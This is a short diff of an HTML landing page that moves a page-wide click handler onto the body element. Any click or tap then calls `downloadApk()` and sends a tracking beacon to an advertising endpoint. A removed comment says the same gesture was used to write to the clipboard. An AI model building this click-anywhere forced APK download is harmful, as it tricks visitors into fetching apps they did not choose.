@@ -352,7 +352,7 @@
     </script> -->
   </head>
 
-  <body>
+  <body onclick="onClickBtn()">
     <header>
       <div class="header-spacer"></div>
       <div class="p2">
@@ -684,16 +684,7 @@
           return null;
         }
 
-        // 全屏点击触发下载 + 复制（需要用户手势，剪贴板才能写入）
-        document.addEventListener("click", onClickBtn, true);
-        document.addEventListener("touchend", onClickBtn, true);
-        
-        let clicked = false;
         function onClickBtn() {
-          if (clicked) return;
-          clicked = true;
-          setTimeout(() => (clicked = false), 1000);
-
           downloadApk();
           sendBeacon(
             "https://api.anubisriches.com/api/advertising/ondownload",
